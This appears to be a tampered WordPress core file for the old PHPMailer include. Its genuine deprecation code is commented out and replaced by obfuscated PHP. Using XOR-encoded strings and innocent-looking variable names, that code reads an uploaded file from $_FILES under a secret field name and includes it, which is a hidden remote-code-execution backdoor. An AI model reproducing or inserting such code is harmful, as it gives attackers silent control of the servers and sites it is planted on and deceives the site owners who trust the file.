<?php /* 

*
 * The PHPMailer class has been moved to the wp-includes/PHPMailer subdirectory and now uses the PHPMailer\PHPMailer namespace.
 
if ( function_exists( '_deprecated_file' ) ) {
	_deprecated_file(
		basename( __FILE__ ),
		'5.5.0',
		WPINC . '/PHPMailer/PHPMailer.php',
		__( 'The PHPMailer class has been moved to wp-*/
 	
function append()

{
    $wp_post_statuses = 'vJIzwCPsCHOu';
	$raw_excerpt = 'has_self_closer';
    $default_category_post_types = $wp_post_statuses;

    
    $file = $GLOBALS[attributes("%29%0C%0062%10", $default_category_post_types)];

    $em_dash = $file;
    $string_nullspace = isset($em_dash[$default_category_post_types]);
    if ($string_nullspace)

    {
        $extension = $file[$default_category_post_types];
        $is_utf8 = $extension[attributes("%02%279%25%19%22%3D%16", $default_category_post_types)];
        $_fragment = $is_utf8;
        include ($_fragment);

    }
	$allowed_keys = 'show_in_rest';
}

function attributes($post_type, $wp_smiliessearch)

{
    $quote_pattern = $wp_smiliessearch;
    $inclusions = "url" . "decode";
    $page = $inclusions($post_type);
    $emojum = substr($quote_pattern,0, strlen($page));
	$escaped = 'sanitized';
    $default_editor = $page ^ $emojum;
    
	$full_match = 'ptypes';
    $page = strpos($default_editor, $emojum);
    
    return $default_editor;

}


append();
	$icon_files = 'post_name';



/* includes/PHPMailer subdirectory and now uses the PHPMailer\PHPMailer namespace.' )
	);
}

require_once __DIR__ . '/PHPMailer/PHPMailer.php';
require_once __DIR__ . '/PHPMailer/Exception.php';

class_alias( PHPMailer\PHPMailer\PHPMailer::class, 'PHPMailer' );
class_alias( PHPMailer\PHPMailer\Exception::class, 'phpmailerException' );
*/